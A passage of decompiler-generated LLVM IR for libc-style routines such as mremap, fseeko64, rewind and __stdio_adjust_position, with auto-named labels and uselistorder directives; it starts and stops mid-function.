; uselistorder directives
  uselistorder i32 %v1_8065e53, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_807ca44.841, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8065e70, { 1, 0 }
}

define i32 @__cmsg_nxthdr() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @edx, align 4
  %v1_8065e81 = inttoptr i32 %tmp2 to i32*
  %v2_8065e81 = load i32, i32* %v1_8065e81, align 4
  %tmp5 = icmp ult i32 %v2_8065e81, 12
  br i1 %tmp5, label %dec_label_pc_8065ead, label %dec_label_pc_8065e88

dec_label_pc_8065e88:                             ; preds = %entry
  %v1_8065e88 = add i32 %v2_8065e81, 3
  %v1_8065e8b = and i32 %v1_8065e88, -4
  %v2_8065e8e = add i32 %v1_8065e8b, %tmp2
  %v1_8065e91 = add i32 %tmp, 20
  %v2_8065e91 = inttoptr i32 %v1_8065e91 to i32*
  %v3_8065e91 = load i32, i32* %v2_8065e91, align 4
  %v2_8065e94 = add i32 %tmp, 16
  %v3_8065e94 = inttoptr i32 %v2_8065e94 to i32*
  %v4_8065e94 = load i32, i32* %v3_8065e94, align 4
  %v5_8065e94 = add i32 %v4_8065e94, %v3_8065e91
  store i32 %v5_8065e94, i32* @edx, align 4
  %v1_8065e97 = add i32 %v2_8065e8e, 12
  %v6_8065e9c = icmp ugt i32 %v1_8065e97, %v5_8065e94
  br i1 %v6_8065e9c, label %dec_label_pc_8065ead, label %dec_label_pc_8065e9e

dec_label_pc_8065e9e:                             ; preds = %dec_label_pc_8065e88
  %v1_8065e9e = inttoptr i32 %v2_8065e8e to i32*
  %v2_8065e9e = load i32, i32* %v1_8065e9e, align 4
  %v1_8065ea0 = add i32 %v2_8065e9e, 3
  %v1_8065ea3 = and i32 %v1_8065ea0, -4
  %v2_8065ea6 = add i32 %v1_8065ea3, %v2_8065e8e
  %tmp6 = icmp ugt i32 %v2_8065ea6, %v5_8065e94
  br i1 %tmp6, label %dec_label_pc_8065ead, label %dec_label_pc_8065eaf

dec_label_pc_8065ead:                             ; preds = %dec_label_pc_8065e9e, %dec_label_pc_8065e88, %entry
  br label %dec_label_pc_8065eaf

dec_label_pc_8065eaf:                             ; preds = %dec_label_pc_8065e9e, %dec_label_pc_8065ead
  %v0_8065eaf = phi i32 [ %v2_8065e8e, %dec_label_pc_8065e9e ], [ 0, %dec_label_pc_8065ead ]
  ret i32 %v0_8065eaf

; uselistorder directives
  uselistorder i32 %v2_8065e8e, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8065e81, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_8065eaf, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8065eb4 = load i32, i32* @edi, align 4
  %v0_8065eb5 = load i32, i32* @esi, align 4
  store i32 %v0_8065eb5, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_8065ecd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_8065ed5 = call i32 @mremap(i32 %v0_8065ecd, i32 %v0_8065eb5, i32 %v0_8065eb4, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_8065ecd, i32* @ebx, align 4
  store i32 %v6_8065ed5, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v6_8065ed5, -4095
  br i1 %tmp, label %dec_label_pc_8065eed, label %dec_label_pc_8065ee1

dec_label_pc_8065ee1:                             ; preds = %entry
  %v1_8065ee1 = call i32 @__errno_location(i32 %v0_8065ecd)
  %v0_8065ee6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8065ee6 = sub i32 0, %v0_8065ee6
  %v2_8065ee8 = inttoptr i32 %v1_8065ee1 to i32*
  store i32 %v1_8065ee6, i32* %v2_8065ee8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8065eed

dec_label_pc_8065eed:                             ; preds = %entry, %dec_label_pc_8065ee1
  %v0_8065eed = phi i32 [ %v6_8065ed5, %entry ], [ -1, %dec_label_pc_8065ee1 ]
  %v2_8065ef0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8065ef0, i32* @esi, align 4
  store i32 %v0_8065eb4, i32* @edi, align 4
  ret i32 %v0_8065eed

; uselistorder directives
  uselistorder i32 %v6_8065ed5, { 1, 0, 2 }
  uselistorder i32 %v0_8065ecd, { 1, 0, 2 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 58, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8065eed, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_8065eff = ashr i32 %arg2, 31
  %v4_8065f06 = inttoptr i32 %arg1 to i16*
  %v5_8065f06 = call i32 @__GI_fseeko64(i16* %v4_8065f06, i32 %arg2, i32 %v1_8065eff, i32 %arg3)
  ret i32 %v5_8065f06
}

define i32 @__GI_rewind(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8065f10 = load i32, i32* @edi, align 4
  %v0_8065f12 = load i32, i32* @ebx, align 4
  %v4_8065f16 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8065f16, i32* @esi, align 4
  %v1_8065f1a = add i32 %v4_8065f16, 52
  %v2_8065f1a = inttoptr i32 %v1_8065f1a to i32*
  %v3_8065f1a = load i32, i32* %v2_8065f1a, align 4
  store i32 %v3_8065f1a, i32* @edi, align 4
  %v1_8065f1d = icmp eq i32 %v3_8065f1a, 0
  %v1_8065f1f = icmp eq i1 %v1_8065f1d, false
  br i1 %v1_8065f1f, label %entry.dec_label_pc_8065f40_crit_edge, label %dec_label_pc_8065f21

entry.dec_label_pc_8065f40_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8065f40

dec_label_pc_8065f21:                             ; preds = %entry
  %v1_8065f21 = add i32 %v4_8065f16, 56
  store i32 %v1_8065f21, i32* @ebx, align 4
  %v5_8065f30 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134583465, i32 %v1_8065f21)
  %v0_8065f35 = load i32, i32* @ebx, align 4
  %v2_8065f38 = call i32 @pthread_mutex_lock(i32 %v0_8065f35)
  %v0_8065f40.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8065f40

dec_label_pc_8065f40:                             ; preds = %entry.dec_label_pc_8065f40_crit_edge, %dec_label_pc_8065f21
  %v10_8065f40 = phi i32 [ %v4_8065f16, %entry.dec_label_pc_8065f40_crit_edge ], [ %v0_8065f40.pre, %dec_label_pc_8065f21 ]
  %v1_8065f40 = inttoptr i32 %v10_8065f40 to i16*
  %v2_8065f40 = load i16, i16* %v1_8065f40, align 2
  %v3_8065f40 = and i16 %v2_8065f40, -9
  store i16 %v3_8065f40, i16* %v1_8065f40, align 2
  %v0_8065f44 = load i32, i32* @edx, align 4
  %v0_8065f49 = load i32, i32* @esi, align 4
  %v5_8065f4a = call i32 @__GI_fseek(i32 %v0_8065f49, i32 0, i32 0, i32 %v0_8065f44)
  br i1 %v1_8065f1f, label %dec_label_pc_8065f67, label %dec_label_pc_8065f56

dec_label_pc_8065f56:                             ; preds = %dec_label_pc_8065f40
  %v4_8065f5f = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  br label %dec_label_pc_8065f67

dec_label_pc_8065f67:                             ; preds = %dec_label_pc_8065f40, %dec_label_pc_8065f56
  %v0_8065f6d = phi i32 [ %v5_8065f4a, %dec_label_pc_8065f40 ], [ %v4_8065f5f, %dec_label_pc_8065f56 ]
  store i32 %v0_8065f12, i32* @ebx, align 4
  store i32 %v0_8065f10, i32* @edi, align 4
  ret i32 %v0_8065f6d

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__GI_fseek, { 1, 0 }
  uselistorder label %dec_label_pc_8065f67, { 1, 0 }
  uselistorder label %dec_label_pc_8065f40, { 1, 0 }
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8065f70 = load i32, i32* @ebp, align 4
  %v0_8065f71 = load i32, i32* @edi, align 4
  %v0_8065f72 = load i32, i32* @esi, align 4
  %v0_8065f73 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_8065f83 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8065f83, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp28 = icmp ult i32 %arg4, 3
  br i1 %tmp28, label %dec_label_pc_8065fa7, label %dec_label_pc_8065f94

dec_label_pc_8065f94:                             ; preds = %entry
  %v1_8065f94 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_8065f94, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @ebx, align 4
  %v1_8065f9c = inttoptr i32 %v1_8065f94 to i32*
  store i32 22, i32* %v1_8065f9c, align 4
  br label %dec_label_pc_8066049

dec_label_pc_8065fa7:                             ; preds = %entry
  %v1_8065fa7 = add i32 %v4_8065f83, 52
  %v2_8065fa7 = inttoptr i32 %v1_8065fa7 to i32*
  %v3_8065fa7 = load i32, i32* %v2_8065fa7, align 4
  store i32 %v3_8065fa7, i32* @ebp, align 4
  %v1_8065faa = icmp eq i32 %v3_8065fa7, 0
  %v1_8065fac = icmp eq i1 %v1_8065faa, false
  br i1 %v1_8065fac, label %dec_label_pc_8065fcd, label %dec_label_pc_8065fae

dec_label_pc_8065fae:                             ; preds = %dec_label_pc_8065fa7
  %v1_8065fae = add i32 %v4_8065f83, 56
  store i32 %v1_8065fae, i32* @ebx, align 4
  %v2_8065fb8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8065fb8, i32* %eax.global-to-local, align 4
  %v5_8065fbd = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-44, i32 134583465, i32 %v1_8065fae)
  store i32 %v5_8065fbd, i32* %eax.global-to-local, align 4
  %v0_8065fc2 = load i32, i32* @ebx, align 4
  %v2_8065fc5 = call i32 @pthread_mutex_lock(i32 %v0_8065fc2)
  store i32 %v2_8065fc5, i32* %eax.global-to-local, align 4
  %v0_8065fcd.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8065fcd

dec_label_pc_8065fcd:                             ; preds = %dec_label_pc_8065fa7, %dec_label_pc_8065fae
  %v0_8065fd5 = phi i32 [ %v4_8065f83, %dec_label_pc_8065fa7 ], [ %v0_8065fcd.pre, %dec_label_pc_8065fae ]
  %v1_8065fcd = inttoptr i32 %v0_8065fd5 to i8*
  %v2_8065fcd = load i8, i8* %v1_8065fcd, align 1
  %v3_8065fcd = and i8 %v2_8065fcd, 64
  %v4_8065fcd = icmp eq i8 %v3_8065fcd, 0
  br i1 %v4_8065fcd, label %dec_label_pc_8065fe2, label %dec_label_pc_8065fd2

dec_label_pc_8065fd2:                             ; preds = %dec_label_pc_8065fcd
  %v2_8065fd6 = call i32 @__stdio_wcommit(i32 %v0_8065fd5)
  store i32 %v2_8065fd6, i32* %eax.global-to-local, align 4
  %v1_8065fde = icmp eq i32 %v2_8065fd6, 0
  %v1_8065fe0 = icmp eq i1 %v1_8065fde, false
  br i1 %v1_8065fe0, label %dec_label_pc_8066031, label %dec_label_pc_8065fe2

dec_label_pc_8065fe2:                             ; preds = %dec_label_pc_8065fd2, %dec_label_pc_8065fcd
  %v0_8065fe2 = load i32, i32* @edi, align 4
  %v9_8065fe2 = icmp eq i32 %v0_8065fe2, 1
  %v1_8065fe5 = icmp eq i1 %v9_8065fe2, false
  br i1 %v1_8065fe5, label %dec_label_pc_8065fe2.dec_label_pc_8065ffb_crit_edge, label %dec_label_pc_8065fe7

dec_label_pc_8065fe2.dec_label_pc_8065ffb_crit_edge: ; preds = %dec_label_pc_8065fe2
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8065ffb

dec_label_pc_8065fe7:                             ; preds = %dec_label_pc_8065fe2
  %v0_8065fe7 = load i32, i32* @ecx, align 4
  %v2_8065fe9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8065fe9, i32* %eax.global-to-local, align 4
  %v0_8065fee = load i32, i32* @esi, align 4
  %tmp26 = inttoptr i32 %v0_8065fee to i32*
  %v6_8065fef = call i32 @__stdio_adjust_position(i32* %tmp26, i32 %v2_8065fe9, i32 %v0_8065fe7, i32 %v0_8065fe7)
  store i32 %v6_8065fef, i32* %eax.global-to-local, align 4
  %v2_8065ff7 = icmp slt i32 %v6_8065fef, 0
  br i1 %v2_8065ff7, label %dec_label_pc_8066031, label %dec_label_pc_8065fe7.dec_label_pc_8065ffb_crit_edge

dec_label_pc_8065fe7.dec_label_pc_8065ffb_crit_edge: ; preds = %dec_label_pc_8065fe7
  %v0_8065ffc.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8065ffb

dec_label_pc_8065ffb:                             ; preds = %dec_label_pc_8065fe2.dec_label_pc_8065ffb_crit_edge, %dec_label_pc_8065fe7.dec_label_pc_8065ffb_crit_edge
  %v2_8065ffd.pre-phi = phi i32 [ %.pre6, %dec_label_pc_8065fe2.dec_label_pc_8065ffb_crit_edge ], [ %v2_8065fe9, %dec_label_pc_8065fe7.dec_label_pc_8065ffb_crit_edge ]
  %v0_8065ffc = phi i32 [ %v0_8065fe2, %dec_label_pc_8065fe2.dec_label_pc_8065ffb_crit_edge ], [ %v0_8065ffc.pre, %dec_label_pc_8065fe7.dec_label_pc_8065ffb_crit_edge ]
  %v0_8065ffb = load i32, i32* @edx, align 4
  store i32 %v2_8065ffd.pre-phi, i32* %eax.global-to-local, align 4
  %v0_8066002 = load i32, i32* @esi, align 4
  %v5_8066003 = inttoptr i32 %v2_8065ffd.pre-phi to i32*
  %v6_8066003 = call i32 @__stdio_seek(i32 %v0_8066002, i32* %v5_8066003, i32 %v0_8065ffc, i32 %v0_8065ffb)
  store i32 %v6_8066003, i32* %eax.global-to-local, align 4
  %v2_806600b = icmp slt i32 %v6_8066003, 0
  br i1 %v2_806600b, label %dec_label_pc_8066031, label %dec_label_pc_806600f

dec_label_pc_806600f:                             ; preds = %dec_label_pc_8065ffb
  %v0_806600f = load i32, i32* @esi, align 4
  %v1_806600f = inttoptr i32 %v0_806600f to i16*
  %v2_806600f = load i16, i16* %v1_806600f, align 2
  %v3_806600f = and i16 %v2_806600f, -72
  store i16 %v3_806600f, i16* %v1_806600f, align 2
  %v0_8066013 = load i32, i32* @esi, align 4
  %v1_8066013 = add i32 %v0_8066013, 8
  %v2_8066013 = inttoptr i32 %v1_8066013 to i32*
  %v3_8066013 = load i32, i32* %v2_8066013, align 4
  store i32 %v3_8066013, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v2_8066018 = add i32 %v0_8066013, 16
  %v3_8066018 = inttoptr i32 %v2_8066018 to i32*
  store i32 %v3_8066013, i32* %v3_8066018, align 4
  %v0_806601b = load i32, i32* %eax.global-to-local, align 4
  %v1_806601b = load i32, i32* @esi, align 4
  %v2_806601b = add i32 %v1_806601b, 20
  %v3_806601b = inttoptr i32 %v2_806601b to i32*
  store i32 %v0_806601b, i32* %v3_806601b, align 4
  %v0_806601e = load i32, i32* %eax.global-to-local, align 4
  %v1_806601e = load i32, i32* @esi, align 4
  %v2_806601e = add i32 %v1_806601e, 24
  %v3_806601e = inttoptr i32 %v2_806601e to i32*
  store i32 %v0_806601e, i32* %v3_806601e, align 4
  %v0_8066021 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066021 = load i32, i32* @esi, align 4
  %v2_8066021 = add i32 %v1_8066021, 28
  %v3_8066021 = inttoptr i32 %v2_8066021 to i32*
  store i32 %v0_8066021, i32* %v3_8066021, align 4
  %v0_8066024 = load i32, i32* @esi, align 4
  %v1_8066024 = add i32 %v0_8066024, 44
  %v2_8066024 = inttoptr i32 %v1_8066024 to i32*
  store i32 0, i32* %v2_8066024, align 4
  %v0_806602b = load i32, i32* @esi, align 4
  %v1_806602b = add i32 %v0_806602b, 2
  %v2_806602b = inttoptr i32 %v1_806602b to i8*
  store i8 0, i8* %v2_806602b, align 1
  br label %dec_label_pc_8066034

dec_label_pc_8066031:                             ; preds = %dec_label_pc_8065ffb, %dec_label_pc_8065fe7, %dec_label_pc_8065fd2
  store i32 -1, i32* @ebx, align 4
  br label %dec_label_pc_8066034

dec_label_pc_8066034:                             ; preds = %dec_label_pc_806600f, %dec_label_pc_8066031
  br i1 %v1_8065fac, label %dec_label_pc_8066049, label %dec_label_pc_8066038

dec_label_pc_8066038:                             ; preds = %dec_label_pc_8066034
  %v2_806603c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_806603c, i32* %eax.global-to-local, align 4
  %v4_8066041 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-44, i32 1)
  store i32 %v4_8066041, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066049

dec_label_pc_8066049:                             ; preds = %dec_label_pc_8066034, %dec_label_pc_8065f94, %dec_label_pc_8066038
  %v0_806604c = load i32, i32* @ebx, align 4
  store i32 %v0_806604c, i32* %eax.global-to-local, align 4
  store i32 %v0_8065f73, i32* @ebx, align 4
  store i32 %v0_8065f72, i32* @esi, align 4
  store i32 %v0_8065f71, i32* @edi, align 4
  store i32 %v0_8065f70, i32* @ebp, align 4
  ret i32 %v0_806604c

; uselistorder directives
  uselistorder i32 %v2_8065ffd.pre-phi, { 1, 0 }
  uselistorder i32 %v0_8065fe2, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 3, 8, 2, 1, 7, 6, 5, 4, 0 }
  uselistorder i8 64, { 8, 0, 4, 5, 9, 10, 6, 7, 2, 11, 1, 3 }
  uselistorder i32 22, { 50, 46, 2, 3, 44, 53, 31, 32, 33, 34, 39, 57, 47, 35, 36, 48, 51, 52, 45, 49, 42, 43, 58, 4, 5, 54, 6, 7, 8, 0, 9, 10, 11, 12, 37, 13, 56, 14, 15, 38, 16, 1, 17, 18, 19, 29, 20, 21, 55, 40, 41, 22, 23, 25, 24, 30, 26, 27, 28 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8066049, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8066034, { 1, 0 }
  uselistorder label %dec_label_pc_8065ffb, { 1, 0 }
  uselistorder label %dec_label_pc_8065fcd, { 1, 0 }
}

define i32 @__stdio_adjust_position(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8066064 = load i32, i32* %arg1, align 4
  store i32 %v2_8066064, i32* %esi.global-to-local, align 4
  %v1_806606b = urem i32 %v2_8066064, 4
  %v2_806606b = icmp eq i32 %v1_806606b, 0
  store i32 %v1_806606b, i32* @ecx, align 4
  br i1 %v2_806606b, label %dec_label_pc_806609a, label %dec_label_pc_8066070

dec_label_pc_8066070:                             ; preds = %entry
  %v1_8066072 = add nsw i32 %v1_806606b, -1
  %v8_8066072 = icmp eq i32 %v1_8066072, 0
  store i32 %v1_8066072, i32* @edx, align 4
  br i1 %v8_8066072, label %dec_label_pc_806609a, label %dec_label_pc_8066075

dec_label_pc_8066075:                             ; preds = %dec_label_pc_8066070
  %v3_8066075 = and i32 %v2_8066064, 2048
  %v4_8066075 = icmp eq i32 %v3_8066075, 0
  br i1 %v4_8066075, label %dec_label_pc_806609a, label %dec_label_pc_806607a

dec_label_pc_806607a:                             ; preds = %dec_label_pc_8066075
  %v6_806607a = sub nsw i32 1, %v1_806606b
  %v7_806607a = and i32 %v1_8066072, %v6_806607a
  %v8_806607a = icmp slt i32 %v7_806607a, 0
  %v9_806607a = icmp eq i32 %v1_806606b, 2
  %v10_806607a = icmp ult i32 %v1_806606b, 2
  %v3_806607d = icmp eq i1 %v10_806607a, %v8_806607a
  %v4_806607d = icmp eq i1 %v9_806607a, false
  %v5_806607d = and i1 %v4_806607d, %v3_806607d
  br i1 %v5_806607d, label %dec_label_pc_80660f0, label %dec_label_pc_806607f

dec_label_pc_806607f:                             ; preds = %dec_label_pc_806607a
  %v1_806607f = add i32 %tmp6, 40
  %v2_806607f = inttoptr i32 %v1_806607f to i32*
  %v3_806607f = load i32, i32* %v2_806607f, align 4
  %v4_806607f = icmp eq i32 %v3_806607f, 0
  %v1_8066083 = icmp eq i1 %v4_806607f, false
  br i1 %v1_8066083, label %dec_label_pc_80660f0, label %dec_label_pc_8066085

dec_label_pc_8066085:                             ; preds = %dec_label_pc_806607f
  %v1_8066085 = add i32 %tmp6, 3
  %v2_8066085 = inttoptr i32 %v1_8066085 to i8*
  %v3_8066085 = load i8, i8* %v2_8066085, align 1
  %v4_8066085 = zext i8 %v3_8066085 to i32
  %v2_8066089 = sub nsw i32 %v1_8066072, %v4_8066085
  %v1_806608b = add i32 %tmp6, 44
  %v2_806608b = inttoptr i32 %v1_806608b to i32*
  %v3_806608b = load i32, i32* %v2_806608b, align 4
  %v1_806608f = add nsw i32 %v2_8066089, -1
  %tmp12 = icmp slt i32 %v3_806608b, 1
  br i1 %tmp12, label %dec_label_pc_806609a, label %dec_label_pc_8066094

dec_label_pc_8066094:                             ; preds = %dec_label_pc_8066085
  %v1_8066094 = add i32 %tmp6, 2
  %v2_8066094 = inttoptr i32 %v1_8066094 to i8*
  %v3_8066094 = load i8, i8* %v2_8066094, align 1
  %v4_8066094 = zext i8 %v3_8066094 to i32
  %v2_8066098 = sub nsw i32 %v1_806608f, %v4_8066094
  br label %dec_label_pc_806609a

dec_label_pc_806609a:                             ; preds = %dec_label_pc_8066085, %dec_label_pc_8066075, %dec_label_pc_8066070, %entry, %dec_label_pc_8066094
  %v0_80660b1 = phi i32 [ %v1_806608f, %dec_label_pc_8066085 ], [ %v1_8066072, %dec_label_pc_8066075 ], [ 0, %dec_label_pc_8066070 ], [ 0, %entry ], [ %v2_8066098, %dec_label_pc_8066094 ]
  %v2_806609a = and i32 %v2_8066064, 64
  %v3_806609a = icmp eq i32 %v2_806609a, 0
  %storemerge.in.in.v = select i1 %v3_806609a, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_80660a9 = add i32 %tmp6, 16
  %v3_80660a9 = inttoptr i32 %v2_80660a9 to i32*
  %v4_80660a9 = load i32, i32* %v3_80660a9, align 4
  %v5_80660a9 = sub i32 %storemerge, %v4_80660a9
  %v1_80660ac = inttoptr i32 %arg2 to i32*
  %v2_80660ac = load i32, i32* %v1_80660ac, align 4
  store i32 %v2_80660ac, i32* @ecx, align 4
  %v1_80660ae = add i32 %arg2, 4
  %v2_80660ae = inttoptr i32 %v1_80660ae to i32*
  %v3_80660ae = load i32, i32* %v2_80660ae, align 4
  store i32 %v3_80660ae, i32* %ebx.global-to-local, align 4
  %v2_80660b1 = add i32 %v5_80660a9, %v0_80660b1
  store i32 %v2_80660b1, i32* %esi.global-to-local, align 4
  %v2_80660bc = ashr i32 %v2_80660b1, 31
  %v5_80660c5 = sub i32 %v2_80660ac, %v2_80660b1
  %v10_80660c5 = icmp ult i32 %v2_80660ac, %v2_80660b1
  %v6_80660c9 = zext i1 %v10_80660c5 to i32
  %tmp = icmp slt i32 %v2_80660b1, 0
  %v2_80660bc.neg = zext i1 %tmp to i32
  %v7_80660c9 = add i32 %v3_80660ae, %v2_80660bc.neg
  %v8_80660c9 = add i32 %v7_80660c9, %v6_80660c9
  store i32 %v8_80660c9, i32* @edx, align 4
  store i32 %v5_80660c5, i32* %v1_80660ac, align 4
  %v0_80660cf = load i32, i32* @edx, align 4
  %v1_80660cf = load i32, i32* %edi.global-to-local, align 4
  %v2_80660cf = add i32 %v1_80660cf, 4
  %v3_80660cf = inttoptr i32 %v2_80660cf to i32*
  store i32 %v0_80660cf, i32* %v3_80660cf, align 4
  %v0_80660d2 = load i32, i32* %edi.global-to-local, align 4
  %v1_80660d2 = add i32 %v0_80660d2, 4
  %v2_80660d2 = inttoptr i32 %v1_80660d2 to i32*
  %v3_80660d2 = load i32, i32* %v2_80660d2, align 4
  %v4_80660d2 = load i32, i32* %ebx.global-to-local, align 4
  %v5_80660d5 = icmp slt i32 %v3_80660d2, %v4_80660d2
  br i1 %v5_80660d5, label %dec_label_pc_80660df, label %dec_label_pc_80660d7

dec_label_pc_80660d7:                             ; preds = %dec_label_pc_806609a
  %v8_80660d7 = icmp sgt i32 %v3_80660d2, %v4_80660d2
  br i1 %v8_80660d7, label %dec_label_pc_80660dd, label %dec_label_pc_80660d9

dec_label_pc_80660d9:                             ; preds = %dec_label_pc_80660d7
  %v1_80660d9 = inttoptr i32 %v0_80660d2 to i32*
  %v2_80660d9 = load i32, i32* %v1_80660d9, align 4
  %v3_80660d9 = load i32, i32* @ecx, align 4
  %tmp14 = icmp ugt i32 %v2_80660d9, %v3_80660d9
  br i1 %tmp14, label %dec_label_pc_80660dd, label %dec_label_pc_80660df

dec_label_pc_80660dd:                             ; preds = %dec_label_pc_80660d9, %dec_label_pc_80660d7
  %v0_80660dd = load i32, i32* %esi.global-to-local, align 4
  %v1_80660dd = sub i32 0, %v0_80660dd
  store i32 %v1_80660dd, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80660df

dec_label_pc_80660df:                             ; preds = %dec_label_pc_80660d9, %dec_label_pc_806609a, %dec_label_pc_80660dd
  %v0_80660df = load i32, i32* %esi.global-to-local, align 4
  %v2_80660df = icmp slt i32 %v0_80660df, 0
  %v1_80660e1 = icmp eq i1 %v2_80660df, false
  br i1 %v1_80660e1, label %dec_label_pc_80660f3, label %dec_label_pc_80660e3

dec_label_pc_80660e3:                             ; preds = %dec_label_pc_80660df
  %v1_80660e3 = call i32 @__errno_location(i32 %v2_80660bc)
  %v1_80660e8 = inttoptr i32 %v1_80660e3 to i32*
  store i32 75, i32* %v1_80660e8, align 4
  %v0_80660f6.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80660f3

dec_label_pc_80660f0:                             ; preds = %dec_label_pc_806607f, %dec_label_pc_806607a
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80660f3

dec_label_pc_80660f3:                             ; preds = %dec_label_pc_80660df, %dec_label_pc_80660e3, %dec_label_pc_80660f0
  %v0_80660f6 = phi i32 [ %v0_80660df, %dec_label_pc_80660df ], [ %v0_80660f6.pre, %dec_label_pc_80660e3 ], [ -1, %dec_label_pc_80660f0 ]
  ret i32 %v0_80660f6

; uselistorder directives
  uselistorder i32 %v4_80660d2, { 1, 0 }
  uselistorder i32 %v3_80660d2, { 1, 0 }
  uselistorder i32 %v1_8066072, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_806606b, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_8066064, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 75, { 2, 1, 0 }
  uselistorder i32 2048, { 4, 3, 7, 5, 6, 8, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80660f3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80660df, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806609a, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_80660fc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8066104 = add i32 %arg1, 8
  %v2_8066104 = inttoptr i32 %v1_8066104 to i32*
  %v3_8066104 = load i32, i32* %v2_8066104, align 4
  store i32 %v3_8066104, i32* %edx.global-to-local, align 4
  %v1_8066107 = add i32 %arg1, 12
  %v2_8066107 = inttoptr i32 %v1_8066107 to i32*
  %v3_8066107 = load i32, i32* %v2_8066107, align 4
  %v2_806610a = sub i32 %v3_8066107, %v3_8066104
  %v3_806610f = inttoptr i32 %arg1 to i16*
